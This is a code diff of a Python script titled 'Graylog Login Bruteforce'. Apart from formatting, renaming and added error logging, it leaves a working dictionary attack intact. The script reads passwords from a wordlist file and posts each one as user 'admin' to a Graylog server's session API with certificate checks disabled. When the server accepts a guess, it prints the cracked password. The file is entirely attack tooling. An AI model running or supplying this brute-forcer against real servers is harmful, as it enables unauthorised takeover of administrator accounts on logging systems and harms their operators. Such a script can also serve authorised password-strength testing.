@@ -2,52 +2,57 @@
 
 # Graylog Login Bruteforce
 
-#%%%%%%%%%%% Libraries %%%%%%%%%%%#
+# %%%%%%%%%%% Libraries %%%%%%%%%%%#
 
+import colorama
 import json
+import logging
+import os
 import requests
 import sys
-import os
-import colorama
 from colorama import Fore, Style
 
-#%%%%%%%%%%% Constants %%%%%%%%%%%#
+# %%%%%%%%%%% Constants %%%%%%%%%%%#
 
-separator = "[*] ============================================================================================================== [*]"
+SEPARATOR = "[*] {0} [*]".format('=' * 110)
 
-#%%%%%%%%%% Functions %%%%%%%%%#
+# %%%%%%%%%% Functions %%%%%%%%%#
 
-def graylogbrute(graylogip):
+def graylog_brute(graylogip):
 
-    url = "http://"+graylogip+":9000/api/system/sessions"
-    __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
-    file = open(os.path.join(__location__, 'dict.txt'))
-    bruteforcesuccesfull = 0
+	url = "http://" + graylogip + ":9000/api/system/sessions"
+	__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
+	file = open(os.path.join(__location__, 'dict.txt'))
+	bruteforcesuccesfull = 0
 
-    for line in file:
-        graylogpassword = line.strip('\n\r')
-        params = {'username':'admin','password':graylogpassword,'host':graylogip}
-        headers = {'X-Requested-By': 'XMLHttpRequest'}
+	for line in file:
 
-        try:
-            response = requests.post(url,json=params,headers=headers,verify=False)
+		graylogpassword = line.strip('\n\r')
+		params = {'username': 'admin', 'password': graylogpassword, 'host': graylogip}
+		headers = {'X-Requested-By': 'XMLHttpRequest'}
 
-            if response.status_code == 200:
-                print(separator)
-                print("[!] Dictionary Attack Successful!")
-                print(separator)
-                print("[!] Username: "+Fore.RED+Style.BRIGHT+"admin")
-                print(Style.RESET_ALL + "[!] Password: "+Fore.RED+Style.BRIGHT+graylogpassword)
-                print(Style.RESET_ALL + separator)
-                bruteforcesuccesfull = 1
-                break
+		try:
+			response = requests.post(url, json = params, headers = headers, verify = False)
 
-        except Exception as e:
-            pass
+			if response.status_code == 200:
 
-    if not bruteforcesuccesfull:
-        print(separator)
-        print("[!] Dictionary Attack Not Successful")
-        print(separator)
+				print(SEPARATOR)
+				print("[!] Dictionary Attack Successful!")
+				print(SEPARATOR)
+				print("[!] Username: " + Fore.RED + Style.BRIGHT + "admin")
+				print(
+					Style.RESET_ALL + "[!] Password: " + Fore.RED + Style.BRIGHT + graylogpassword)
+				print(Style.RESET_ALL + SEPARATOR)
+				bruteforcesuccesfull = 1
+				break
 
-#%%%%%%%%%% The End %%%%%%%%%%#
+		except Exception as e:
+			logging.error(e, exc_info = True)
+
+	if not bruteforcesuccesfull:
+
+		print(SEPARATOR)
+		print("[!] Dictionary Attack Not Successful")
+		print(SEPARATOR)
+
+# %%%%%%%%%% The End %%%%%%%%%%#
